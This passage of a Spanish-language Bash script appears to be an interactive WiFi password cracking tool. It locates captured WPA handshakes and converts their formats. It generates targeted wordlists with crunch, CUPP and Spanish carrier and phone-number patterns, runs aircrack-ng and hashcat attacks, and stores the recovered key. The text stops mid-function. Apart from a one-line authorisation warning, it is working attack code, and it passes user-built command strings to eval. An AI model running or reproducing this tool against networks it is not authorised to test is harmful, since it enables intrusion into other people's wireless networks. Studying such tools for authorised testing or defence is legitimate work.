#!/bin/bash

# 🔐 WiFi PASSWORD CRACKING ULTIMATE
# Máxima personalización para cracking de contraseñas WiFi con múltiples métodos

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
HANDSHAKE_FILE=""
WORDLIST_FILE=""
ATTACK_METHOD=""
TARGET_ESSID=""
OUTPUT_DIR=""
CUSTOM_WORDLIST=""
GENERATED_WORDLIST=""

print_banner() {
    clear
    echo -e "${RED}"
    echo "██╗    ██╗██╗███████╗██╗    ██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗ "
    echo "██║    ██║██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗"
    echo "██║ █╗ ██║██║█████╗  ██║    ██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║"
    echo "██║███╗██║██║██╔══╝  ██║    ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║"
    echo "╚███╔███╔╝██║██║     ██║    ██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝"
    echo " ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ "
    echo "                                                                                                  "
    echo " ██████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                                  "
    echo "██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                                  "
    echo "██║     ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗                                 "
    echo "██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║                                 "
    echo "╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝                                 "
    echo " ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                  "
    echo -e "${NC}"
    echo -e "${CYAN}🔐 WiFi Password Cracking Ultimate - Máxima Personalización${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización explícita${NC}"
    echo ""
}

select_handshake_file() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}       ${YELLOW}SELECCIÓN DE HANDSHAKE${NC}          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué archivo de handshake quieres crackear?${NC}"
    echo -e "  ${CYAN}1.${NC} 🔍 Buscar automáticamente ${PURPLE}[.cap, .pcap, .hccapx]${NC}"
    echo -e "  ${CYAN}2.${NC} 📁 Especificar ruta manualmente"
    echo -e "  ${CYAN}3.${NC} 🎯 Usar archivo de sesión anterior"
    echo -e "  ${CYAN}4.${NC} 📥 Convertir formato existente"
    echo ""
    
    read -p "Selecciona opción (1-4): " file_choice
    
    case $file_choice in
        1)
            find_handshake_files
            ;;
        2)
            read -p "📁 Ruta completa del handshake: " HANDSHAKE_FILE
            verify_handshake_file
            ;;
        3)
            select_previous_session
            ;;
        4)
            convert_handshake_format
            ;;
        *)
            echo -e "${YELLOW}Buscando automáticamente...${NC}"
            find_handshake_files
            ;;
    esac
}

find_handshake_files() {
    echo -e "${CYAN}🔍 Buscando archivos de handshake...${NC}"
    
    # Buscar en directorios comunes
    local search_dirs=("." "/home/$USER" "/tmp" "/root")
    local found_files=()
    
    for dir in "${search_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            while IFS= read -r -d '' file; do
                found_files+=("$file")
            done < <(find "$dir" -maxdepth 3 \( -name "*.cap" -o -name "*.pcap" -o -name "*.hccapx" \) -type f 2>/dev/null -print0)
        fi
    done
    
    if [[ ${#found_files[@]} -eq 0 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron archivos de handshake${NC}"
        read -p "📁 Especifica la ruta manualmente: " HANDSHAKE_FILE
        return
    fi
    
    echo -e "\n${GREEN}📂 Archivos de handshake encontrados:${NC}"
    echo -e "${BLUE}ID  Archivo                                  Tamaño  Fecha${NC}"
    echo -e "${BLUE}──  ──────────────────────────────────────  ──────  ─────────────${NC}"
    
    for i in "${!found_files[@]}"; do
        local file="${found_files[$i]}"
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local date=$(stat -c %y "$file" 2>/dev/null | cut -d' ' -f1)
        local basename_file=$(basename "$file")
        
        printf "${CYAN}%2d${NC}  %-40s  %-6s  %s\n" "$((i+1))" "$basename_file" "$size" "$date"
    done
    
    echo ""
    read -p "🎯 Selecciona archivo (1-${#found_files[@]}): " file_idx
    
    if [[ "$file_idx" -ge 1 && "$file_idx" -le ${#found_files[@]} ]]; then
        HANDSHAKE_FILE="${found_files[$((file_idx-1))]}"
        verify_handshake_file
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        return 1
    fi
}

verify_handshake_file() {
    if [[ ! -f "$HANDSHAKE_FILE" ]]; then
        echo -e "${RED}❌ Archivo no encontrado: $HANDSHAKE_FILE${NC}"
        return 1
    fi
    
    echo -e "${CYAN}🔍 Verificando handshake...${NC}"
    
    # Verificar con aircrack-ng
    local aircrack_result=$(aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null)
    local handshake_count=$(echo "$aircrack_result" | grep -c "WPA\|handshake" || echo "0")
    
    if [[ $handshake_count -gt 0 ]]; then
        echo -e "${GREEN}✅ Handshake válido detectado!${NC}"
        
        # Extraer ESSID si es posible
        TARGET_ESSID=$(echo "$aircrack_result" | grep -E "ESSID.*:" | head -1 | cut -d':' -f2- | sed 's/^[ \t]*//' | tr -d "'\"")
        
        if [[ -n "$TARGET_ESSID" ]]; then
            echo -e "  📝 ESSID: ${CYAN}$TARGET_ESSID${NC}"
        fi
        
        echo -e "  📊 Handshakes detectados: ${CYAN}$handshake_count${NC}"
    else
        echo -e "${YELLOW}⚠️ No se detectó handshake válido${NC}"
        echo -e "${BLUE}💡 ¿Continuar de todos modos? El archivo puede ser válido${NC}"
        read -p "Continuar? (y/N): " continue_anyway
        [[ $continue_anyway != [yY] ]] && return 1
    fi
    
    echo -e "${GREEN}✅ Archivo de handshake: $HANDSHAKE_FILE${NC}"
}

convert_handshake_format() {
    echo -e "\n${CYAN}📥 Conversión de formato de handshake:${NC}"
    echo -e "  ${CYAN}1.${NC} CAP/PCAP → HCCAPX ${PURPLE}[para hashcat]${NC}"
    echo -e "  ${CYAN}2.${NC} CAP → John the Ripper format"
    echo -e "  ${CYAN}3.${NC} PMKID → Hashcat format"
    echo ""
    
    read -p "Tipo de conversión (1-3): " convert_choice
    read -p "📁 Archivo origen: " source_file
    
    if [[ ! -f "$source_file" ]]; then
        echo -e "${RED}❌ Archivo origen no encontrado${NC}"
        return 1
    fi
    
    case $convert_choice in
        1)
            local output_file="${source_file%.cap}.hccapx"
            echo -e "${CYAN}🔄 Convirtiendo a HCCAPX...${NC}"
            
            if command -v cap2hccapx &> /dev/null; then
                cap2hccapx "$source_file" "$output_file" 2>/dev/null
                if [[ -f "$output_file" ]]; then
                    HANDSHAKE_FILE="$output_file"
                    echo -e "${GREEN}✅ Conversión completada: $output_file${NC}"
                fi
            else
                echo -e "${RED}❌ cap2hccapx no disponible${NC}"
            fi
            ;;
        2)
            local output_file="${source_file%.cap}.john"
            echo -e "${CYAN}🔄 Convirtiendo a John format...${NC}"
            
            if command -v aircrack2john &> /dev/null; then
                aircrack2john "$source_file" > "$output_file"
                HANDSHAKE_FILE="$output_file"
                echo -e "${GREEN}✅ Conversión completada: $output_file${NC}"
            else
                echo -e "${RED}❌ aircrack2john no disponible${NC}"
            fi
            ;;
        3)
            echo -e "${CYAN}🔄 Procesando PMKID...${NC}"
            # Lógica para PMKID
            echo -e "${YELLOW}💡 Usa hcxpcapngtool para convertir PMKID${NC}"
            ;;
    esac
}

select_wordlist_strategy() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}ESTRATEGIA DE WORDLIST${NC}         ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué estrategia de wordlist quieres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 📚 Wordlists predefinidas ${PURPLE}[rockyou, darkweb2017, etc.]${NC}"
    echo -e "  ${CYAN}2.${NC} 🎯 Generar wordlist personalizada ${PURPLE}[crunch, cupp]${NC}"
    echo -e "  ${CYAN}3.${NC} 📊 Wordlist inteligente por ESSID ${PURPLE}[patterns]${NC}"
    echo -e "  ${CYAN}4.${NC} 🔀 Combinar múltiples wordlists"
    echo -e "  ${CYAN}5.${NC} 🌐 Descargar wordlists especializadas"
    echo -e "  ${CYAN}6.${NC} 📝 Crear desde información del objetivo"
    echo ""
    
    read -p "Selecciona estrategia (1-6): " wordlist_choice
    
    case $wordlist_choice in
        1) select_predefined_wordlists ;;
        2) generate_custom_wordlist ;;
        3) generate_intelligent_wordlist ;;
        4) combine_multiple_wordlists ;;
        5) download_specialized_wordlists ;;
        6) create_target_specific_wordlist ;;
        *) 
            echo -e "${YELLOW}Usando wordlists predefinidas por defecto${NC}"
            select_predefined_wordlists
            ;;
    esac
}

select_predefined_wordlists() {
    echo -e "\n${CYAN}📚 Wordlists predefinidas disponibles:${NC}"
    
    local wordlists=(
        "/usr/share/wordlists/rockyou.txt|RockYou|14M contraseñas más comunes"
        "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt|Top 1M|1M más usadas"
        "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017-top10000.txt|DarkWeb 2017|10K del dark web"
        "/usr/share/wordlists/wifite.txt|WiFite Default|Específicas para WiFi"
        "/usr/share/wordlists/fasttrack.txt|FastTrack|Penetration testing"
        "/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt|WPA Probable|4800 más probables para WPA"
    )
    
    echo -e "${BLUE}ID  Wordlist                    Tamaño    Descripción${NC}"
    echo -e "${BLUE}──  ──────────────────────────  ────────  ─────────────────────${NC}"
    
    local available_wordlists=()
    local counter=1
    
    for item in "${wordlists[@]}"; do
        local file=$(echo "$item" | cut -d'|' -f1)
        local name=$(echo "$item" | cut -d'|' -f2)
        local desc=$(echo "$item" | cut -d'|' -f3)
        
        if [[ -f "$file" ]]; then
            local size=$(du -h "$file" 2>/dev/null | cut -f1)
            printf "${CYAN}%2d${NC}  %-30s  %-8s  %s\n" "$counter" "$name" "$size" "$desc"
            available_wordlists+=("$file")
            ((counter++))
        elif [[ "$file" == *"rockyou"* ]] && [[ -f "$file.gz" ]]; then
            echo -e "${YELLOW}📦 Descomprimiendo rockyou.txt...${NC}"
            gunzip "$file.gz" 2>/dev/null || true
            if [[ -f "$file" ]]; then
                local size=$(du -h "$file" | cut -f1)
                printf "${CYAN}%2d${NC}  %-30s  %-8s  %s\n" "$counter" "$name" "$size" "$desc"
                available_wordlists+=("$file")
                ((counter++))
            fi
        fi
    done
    
    if [[ ${#available_wordlists[@]} -eq 0 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron wordlists predefinidas${NC}"
        read -p "📁 Especifica ruta de wordlist: " WORDLIST_FILE
        return
    fi
    
    echo -e "  ${CYAN}0.${NC} 📁 Especificar ruta personalizada"
    echo ""
    
    read -p "🎯 Selecciona wordlist (0-$((counter-1))): " wordlist_idx
    
    if [[ "$wordlist_idx" == "0" ]]; then
        read -p "📁 Ruta de la wordlist: " WORDLIST_FILE
    elif [[ "$wordlist_idx" -ge 1 && "$wordlist_idx" -le ${#available_wordlists[@]} ]]; then
        WORDLIST_FILE="${available_wordlists[$((wordlist_idx-1))]}"
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        return 1
    fi
    
    if [[ -f "$WORDLIST_FILE" ]]; then
        local word_count=$(wc -l < "$WORDLIST_FILE" 2>/dev/null || echo "desconocido")
        echo -e "${GREEN}✅ Wordlist seleccionada: $WORDLIST_FILE${NC}"
        echo -e "  📊 Palabras: ${CYAN}$word_count${NC}"
    else
        echo -e "${RED}❌ Wordlist no encontrada: $WORDLIST_FILE${NC}"
        return 1
    fi
}

generate_custom_wordlist() {
    echo -e "\n${CYAN}🎯 Generación de wordlist personalizada:${NC}"
    
    echo -e "${YELLOW}¿Qué herramienta quieres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 💪 Crunch ${PURPLE}[patrones y máscaras]${NC}"
    echo -e "  ${CYAN}2.${NC} 🎭 CUPP ${PURPLE}[basada en información personal]${NC}"
    echo -e "  ${CYAN}3.${NC} 📱 Generador de contraseñas WiFi comunes"
    echo -e "  ${CYAN}4.${NC} 🔢 Generador numérico avanzado"
    echo ""
    
    read -p "Selecciona generador (1-4): " gen_choice
    
    case $gen_choice in
        1) generate_with_crunch ;;
        2) generate_with_cupp ;;
        3) generate_wifi_common_passwords ;;
        4) generate_numeric_advanced ;;
    esac
}

generate_with_crunch() {
    if ! command -v crunch &> /dev/null; then
        echo -e "${RED}❌ Crunch no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install crunch${NC}"
        return 1
    fi
    
    echo -e "\n${CYAN}💪 Configuración de Crunch:${NC}"
    
    read -p "🔢 Longitud mínima: " min_len
    read -p "🔢 Longitud máxima: " max_len
    
    echo -e "${YELLOW}¿Qué conjunto de caracteres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} Sólo números (0-9)"
    echo -e "  ${CYAN}2.${NC} Sólo letras minúsculas (a-z)"
    echo -e "  ${CYAN}3.${NC} Letras minúsculas + números (a-z0-9)"
    echo -e "  ${CYAN}4.${NC} Todas las letras + números (A-Za-z0-9)"
    echo -e "  ${CYAN}5.${NC} Todos los caracteres ASCII"
    echo -e "  ${CYAN}6.${NC} Personalizado"
    
    read -p "Charset (1-6): " charset_choice
    
    local charset=""
    case $charset_choice in
        1) charset="0123456789" ;;
        2) charset="abcdefghijklmnopqrstuvwxyz" ;;
        3) charset="abcdefghijklmnopqrstuvwxyz0123456789" ;;
        4) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
        5) charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\!\@\#\$\%\^\&\*\(\)" ;;
        6) 
            read -p "🔤 Caracteres personalizados: " charset
            ;;
        *) charset="abcdefghijklmnopqrstuvwxyz0123456789" ;;
    esac
    
    # Configuración avanzada
    echo -e "\n${CYAN}⚙️ Configuración avanzada:${NC}"
    read -p "📝 Patrón específico (ej: @@@@@@@@, -t): " pattern
    read -p "🚫 Excluir caracteres repetitivos? (y/N): " exclude_rep
    
    local output_file="$OUTPUT_DIR/wordlists/crunch_${min_len}_${max_len}.txt"
    mkdir -p "$(dirname "$output_file")"
    
    echo -e "${CYAN}🔧 Generando wordlist con crunch...${NC}"
    
    # Construir comando crunch
    local crunch_cmd="crunch $min_len $max_len"
    [[ -n "$charset" ]] && crunch_cmd="$crunch_cmd $charset"
    [[ -n "$pattern" ]] && crunch_cmd="$crunch_cmd $pattern"
    [[ "$exclude_rep" == [yY]* ]] && crunch_cmd="$crunch_cmd -d 1@"
    crunch_cmd="$crunch_cmd -o $output_file"
    
    echo -e "${BLUE}Comando: $crunch_cmd${NC}"
    
    # Ejecutar con límite de tiempo
    timeout 300 $crunch_cmd 2>&1 | tee "$OUTPUT_DIR/logs/crunch_generation.log" || true
    
    if [[ -f "$output_file" ]]; then
        local word_count=$(wc -l < "$output_file")
        local file_size=$(du -h "$output_file" | cut -f1)
        
        echo -e "${GREEN}✅ Wordlist generada!${NC}"
        echo -e "  📁 Archivo: ${CYAN}$output_file${NC}"
        echo -e "  📊 Palabras: ${CYAN}$word_count${NC}"
        echo -e "  💾 Tamaño: ${CYAN}$file_size${NC}"
        
        WORDLIST_FILE="$output_file"
    else
        echo -e "${RED}❌ Error generando wordlist${NC}"
    fi
}

generate_with_cupp() {
    if ! command -v cupp &> /dev/null; then
        echo -e "${YELLOW}⚠️ CUPP no encontrado, descargando...${NC}"
        
        cd /tmp
        git clone https://github.com/Mebus/cupp.git 2>/dev/null || {
            echo -e "${RED}❌ No se pudo descargar CUPP${NC}"
            return 1
        }
        cd -
    fi
    
    echo -e "\n${CYAN}🎭 Generación con CUPP (Información Personal):${NC}"
    echo -e "${YELLOW}💡 Responde las preguntas para generar contraseñas basadas en información personal${NC}"
    echo ""
    
    local cupp_path="/tmp/cupp/cupp.py"
    [[ ! -f "$cupp_path" ]] && cupp_path="cupp"
    
    local output_file="$OUTPUT_DIR/wordlists/cupp_generated.txt"
    mkdir -p "$(dirname "$output_file")"
    
    echo -e "${CYAN}🚀 Ejecutando CUPP interactivo...${NC}"
    
    if command -v python3 &> /dev/null; then
        python3 "$cupp_path" -i 2>&1 | tee "$OUTPUT_DIR/logs/cupp_generation.log"
    else
        python "$cupp_path" -i 2>&1 | tee "$OUTPUT_DIR/logs/cupp_generation.log"
    fi
    
    # Buscar archivo generado por CUPP
    local cupp_output=$(find . -name "*.txt" -newer "$OUTPUT_DIR" 2>/dev/null | head -1)
    
    if [[ -n "$cupp_output" && -f "$cupp_output" ]]; then
        mv "$cupp_output" "$output_file"
        WORDLIST_FILE="$output_file"
        
        local word_count=$(wc -l < "$output_file")
        echo -e "${GREEN}✅ Wordlist CUPP generada: $word_count palabras${NC}"
    else
        echo -e "${YELLOW}⚠️ No se generó archivo o usa wordlist manual${NC}"
    fi
}

generate_wifi_common_passwords() {
    echo -e "\n${CYAN}📱 Generando contraseñas WiFi comunes...${NC}"
    
    local output_file="$OUTPUT_DIR/wordlists/wifi_common_passwords.txt"
    mkdir -p "$(dirname "$output_file")"
    
    # Patrones comunes para WiFi
    {
        # Patrones por defecto de routers
        echo "admin"
        echo "password"
        echo "12345678"
        echo "1234567890"
        echo "qwertyuiop"
        
        # Patrones de operadoras españolas
        echo "vodafone"
        echo "movistar" 
        echo "orange"
        echo "jazztel"
        echo "masmovil"
        
        # Combinaciones números + letras comunes
        for year in {2010..2024}; do
            echo "wifi$year"
            echo "casa$year" 
            echo "hogar$year"
            echo "internet$year"
        done
        
        # Patrones familiares
        for name in familia casa hogar internet wifi router casa123 hogar123; do
            echo "$name"
            for i in {1..100}; do
                printf "%s%02d\n" "$name" "$i"
            done
        done
        
        # Teléfonos comunes españoles
        for prefix in 600 601 602 603 604 605 606 607 608 609 610 620 630 640 650 660 670 680 690 700; do
            for suffix in {000000..999999}; do
                printf "%s%06d\n" "$prefix" "$suffix"
            done | head -100  # Limitar para no generar demasiados
        done
        
    } > "$output_file"
    
    # Agregar variaciones con mayúsculas y símbolos
    {
        # Leer archivo original y crear variaciones
        while read -r password; do
            echo "$password"
            echo "${password^}"  # Primera letra mayúscula
            echo "${password^^}" # Todo mayúscula
            echo "${password}!"
            echo "${password}123"
            echo "${password}@"
        done < "$output_file"
    } > "${output_file}.tmp"
    
    mv "${output_file}.tmp" "$output_file"
    
    # Remover duplicados
    sort -u "$output_file" -o "$output_file"
    
    local word_count=$(wc -l < "$output_file")
    echo -e "${GREEN}✅ Wordlist WiFi común generada: $word_count contraseñas${NC}"
    
    WORDLIST_FILE="$output_file"
}

select_cracking_method() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}MÉTODO DE CRACKING${NC}             ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué método de cracking quieres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} ⚡ Aircrack-ng ${PURPLE}[CPU, compatible, confiable]${NC}"
    echo -e "  ${CYAN}2.${NC} 🔥 Hashcat ${PURPLE}[GPU, ultra rápido]${NC}"
    echo -e "  ${CYAN}3.${NC} 🔐 John the Ripper ${PURPLE}[versátil, reglas avanzadas]${NC}"
    echo -e "  ${CYAN}4.${NC} 🎯 Método híbrido ${PURPLE}[combina todos]${NC}"
    echo -e "  ${CYAN}5.${NC} 🌊 Ataque distribuido ${PURPLE}[múltiples procesos]${NC}"
    echo -e "  ${CYAN}6.${NC} ⚙️ Configuración personalizada"
    echo ""
    
    read -p "Selecciona método (1-6): " method_choice
    
    case $method_choice in
        1) 
            ATTACK_METHOD="aircrack"
            execute_aircrack_attack
            ;;
        2) 
            ATTACK_METHOD="hashcat"
            execute_hashcat_attack
            ;;
        3) 
            ATTACK_METHOD="john"
            execute_john_attack
            ;;
        4) 
            ATTACK_METHOD="hybrid"
            execute_hybrid_attack
            ;;
        5) 
            ATTACK_METHOD="distributed"
            execute_distributed_attack
            ;;
        6) 
            configure_custom_attack
            ;;
        *) 
            echo -e "${YELLOW}Usando aircrack-ng por defecto${NC}"
            ATTACK_METHOD="aircrack"
            execute_aircrack_attack
            ;;
    esac
}

execute_aircrack_attack() {
    echo -e "\n${YELLOW}⚡ Ejecutando ataque con Aircrack-ng...${NC}"
    
    if [[ ! -f "$HANDSHAKE_FILE" || ! -f "$WORDLIST_FILE" ]]; then
        echo -e "${RED}❌ Handshake o wordlist no disponible${NC}"
        return 1
    fi
    
    echo -e "${CYAN}🎯 Configuración del ataque:${NC}"
    echo -e "  📁 Handshake: ${CYAN}$HANDSHAKE_FILE${NC}"
    echo -e "  📚 Wordlist: ${CYAN}$WORDLIST_FILE${NC}"
    
    # Configuraciones avanzadas
    echo -e "\n${YELLOW}⚙️ Configuraciones avanzadas:${NC}"
    read -p "🔢 ESSID específico (Enter para auto): " specific_essid
    read -p "📊 Mostrar progreso cada N claves (default 1000): " show_progress
    show_progress=${show_progress:-1000}
    
    local output_file="$OUTPUT_DIR/results/aircrack_result.txt"
    local log_file="$OUTPUT_DIR/logs/aircrack_attack.log"
    mkdir -p "$(dirname "$output_file")" "$(dirname "$log_file")"
    
    echo -e "${CYAN}🚀 Iniciando ataque aircrack-ng...${NC}"
    
    # Construir comando
    local aircrack_cmd="aircrack-ng"
    [[ -n "$specific_essid" ]] && aircrack_cmd="$aircrack_cmd -e '$specific_essid'"
    aircrack_cmd="$aircrack_cmd -w '$WORDLIST_FILE'"
    aircrack_cmd="$aircrack_cmd -l '$output_file'"
    aircrack_cmd="$aircrack_cmd '$HANDSHAKE_FILE'"
    
    echo -e "${BLUE}Comando: $aircrack_cmd${NC}"
    echo -e "${YELLOW}⏳ Crackeando... (Ctrl+C para detener)${NC}"
    
    # Ejecutar aircrack-ng
    eval "$aircrack_cmd" 2>&1 | tee "$log_file"
    
    # Verificar resultados
    check_cracking_results "$log_file" "$output_file"
}

execute_hashcat_attack() {
    echo -e "\n${YELLOW}🔥 Ejecutando ataque con Hashcat...${NC}"
    
    if ! command -v hashcat &> /dev/null; then
        echo -e "${RED}❌ Hashcat no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install hashcat${NC}"
        return 1
    fi
    
    # Verificar/convertir formato
    prepare_hashcat_format
    
    echo -e "\n${CYAN}🔥 Configuración de Hashcat:${NC}"
    
    echo -e "${YELLOW}¿Qué tipo de ataque usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 📚 Dictionary attack ${PURPLE}[wordlist básico]${NC}"
    echo -e "  ${CYAN}2.${NC} 🎭 Rule-based attack ${PURPLE}[wordlist + reglas]${NC}"
    echo -e "  ${CYAN}3.${NC} 🔢 Brute force ${PURPLE}[probar todo]${NC}"
    echo -e "  ${CYAN}4.${NC} 🎯 Hybrid attack ${PURPLE}[wordlist + máscaras]${NC}"
    
    read -p "Tipo de ataque (1-4): " hashcat_mode
    
    case $hashcat_mode in
        1) execute_hashcat_dictionary ;;
        2) execute_hashcat_rules ;;
        3) execute_hashcat_bruteforce ;;
        4) execute_hashcat_hybrid ;;
        *) execute_hashcat_dictionary ;;
    esac
}

prepare_hashcat_format() {
    local file_ext="${HANDSHAKE_FILE##*.}"
    
    if [[ "$file_ext" != "hccapx" && "$file_ext" != "22000" ]]; then
        echo -e "${CYAN}🔄 Convirtiendo handshake para hashcat...${NC}"
        
        local hccapx_file="$OUTPUT_DIR/converted/handshake.hccapx"
        mkdir -p "$(dirname "$hccapx_file")"
        
        if command -v cap2hccapx &> /dev/null; then
            cap2hccapx "$HANDSHAKE_FILE" "$hccapx_file" 2>/dev/null
            
            if [[ -f "$hccapx_file" ]]; then
                HANDSHAKE_FILE="$hccapx_file"
                echo -e "${GREEN}✅ Convertido a formato HCCAPX${NC}"
            else
                echo -e "${YELLOW}⚠️ Conversión fallida, intentando con formato original${NC}"
            fi
        else
            echo -e "${YELLOW}⚠️ cap2hccapx no disponible, usando formato original${NC}"
        fi
    fi
}

execute_hashcat_dictionary() {
    echo -e "${CYAN}📚 Ataque de diccionario con Hashcat...${NC}"
    
    local output_file="$OUTPUT_DIR/results/hashcat_result.txt"
    local log_file="$OUTPUT_DIR/logs/hashcat_dictionary.log"
    
    # Detectar modo según formato de archivo
    local hash_mode="2500"  # WPA/WPA2
    [[ "$HANDSHAKE_FILE" == *".hccapx" ]] && hash_mode="2500"
    [[ "$HANDSHAKE_FILE" == *".22000" ]] && hash_mode="22000"
    
    echo -e "${CYAN}⚙️ Configuración:${NC}"
    echo -e "  🔢 Modo: ${CYAN}$hash_mode${NC}"
    echo -e "  📁 Formato: ${CYAN}${HANDSHAKE_FILE##*.}${NC}"
    
    # Configuraciones de optimización
    read -p "🔥 Usar optimización GPU? (Y/n): " use_gpu
    read -p "💪 Workload profile (1-4, default 3): " workload
    workload=${workload:-3}
    
    echo -e "${YELLOW}⏳ Ejecutando hashcat...${NC}"
    
    # Construir comando hashcat
    local hashcat_cmd="hashcat -m $hash_mode -a 0"
    hashcat_cmd="$hashcat_cmd -w $workload"
    [[ "$use_gpu" != [nN]* ]] && hashcat_cmd="$hashcat_cmd -O"
    hashcat_cmd="$hashcat_cmd --outfile='$output_file'"
    hashcat_cmd="$hashcat_cmd --outfile-format=2"
    hashcat_cmd="$hashcat_cmd '$HANDSHAKE_FILE' '$WORDLIST_FILE'"
    
    echo -e "${BLUE}Comando: $hashcat_cmd${NC}"
    
    # Ejecutar hashcat
    eval "$hashcat_cmd" 2>&1 | tee "$log_file"
    
    # Verificar resultados
    check_cracking_results "$log_file" "$output_file"
}

execute_hashcat_rules() {
    echo -e "${CYAN}🎭 Ataque basado en reglas con Hashcat...${NC}"
    
    # Buscar archivos de reglas
    local rule_files=(
        "/usr/share/hashcat/rules/best64.rule"
        "/usr/share/hashcat/rules/rockyou-30000.rule"
        "/usr/share/hashcat/rules/d3ad0ne.rule"
        "/usr/share/hashcat/rules/dive.rule"
    )
    
    echo -e "${YELLOW}📋 Reglas disponibles:${NC}"
    local available_rules=()
    local counter=1
    
    for rule in "${rule_files[@]}"; do
        if [[ -f "$rule" ]]; then
            local rule_count=$(wc -l < "$rule" 2>/dev/null || echo "?")
            echo -e "  ${CYAN}$counter.${NC} $(basename "$rule") ($rule_count reglas)"
            available_rules+=("$rule")
            ((counter++))
        fi
    done
    
    if [[ ${#available_rules[@]} -eq 0 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron archivos de reglas${NC}"
        echo -e "${BLUE}💡 Continuando sin reglas...${NC}"
        execute_hashcat_dictionary
        return
    fi
    
    read -p "🎭 Selecciona archivo de reglas (1-${#available_rules[@]}): " rule_choice
    
    local selected_rule=""
    if [[ "$rule_choice" -ge 1 && "$rule_choice" -le ${#available_rules[@]} ]]; then
        selected_rule="${available_rules[$((rule_choice-1))]}"
    else
        selected_rule="${available_rules[0]}"
    fi
    
    echo -e "${CYAN}🎭 Usando reglas: $(basename "$selected_rule")${NC}"
    
    local output_file="$OUTPUT_DIR/results/hashcat_rules_result.txt"
    local log_file="$OUTPUT_DIR/logs/hashcat_rules.log"
    
    # Ejecutar hashcat con reglas
    local hash_mode="2500"
    local hashcat_cmd="hashcat -m $hash_mode -a 0 -r '$selected_rule'"
    hashcat_cmd="$hashcat_cmd --outfile='$output_file'"
    hashcat_cmd="$hashcat_cmd --outfile-format=2"
    hashcat_cmd="$hashcat_cmd '$HANDSHAKE_FILE' '$WORDLIST_FILE'"
    
    echo -e "${BLUE}Comando: $hashcat_cmd${NC}"
    echo -e "${YELLOW}⏳ Ejecutando ataque con reglas...${NC}"
    
    eval "$hashcat_cmd" 2>&1 | tee "$log_file"
    
    check_cracking_results "$log_file" "$output_file"
}

check_cracking_results() {
    local log_file="$1"
    local output_file="$2"
    
    echo -e "\n${CYAN}📊 Verificando resultados...${NC}"
    
    # Buscar contraseña en diferentes formatos
    local password=""
    
    # Formato aircrack-ng
    password=$(grep -o "KEY FOUND! \[ .* \]" "$log_file" 2>/dev/null | sed 's/KEY FOUND! \[ \(.*\) \]/\1/' | tail -1)
    
    # Formato hashcat (archivo de salida)
    if [[ -z "$password" && -f "$output_file" && -s "$output_file" ]]; then
        password=$(tail -1 "$output_file" 2>/dev/null | cut -d':' -f2 2>/dev/null)
    fi
    
    # Formato hashcat (log)
    if [[ -z "$password" ]]; then
        password=$(grep -E "Status.*Cracked" "$log_file" 2>/dev/null | tail -1)
    fi
    
    if [[ -n "$password" ]]; then
        echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
        echo -e "${YELLOW}🔑 Password: ${password}${NC}"
        
        # Guardar resultado detallado
        local success_file="$OUTPUT_DIR/results/PASSWORD_FOUND.txt"
        {
            echo "=== WiFi PASSWORD CRACKING SUCCESS ==="
            echo "Date: $(date)"
